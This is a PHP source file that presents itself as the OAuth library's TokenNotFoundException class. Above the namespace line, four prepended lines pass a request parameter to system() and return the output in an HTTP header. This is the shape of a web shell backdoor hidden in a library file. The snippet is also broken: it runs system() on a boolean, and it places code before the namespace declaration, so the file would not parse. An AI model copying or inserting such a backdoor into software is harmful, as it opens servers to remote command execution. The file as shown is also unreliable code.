<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace OAuth\Common\Storage\Exception;

/**
 * Exception thrown when a token is not found in storage.
 */
class TokenNotFoundException extends StorageException
{
}
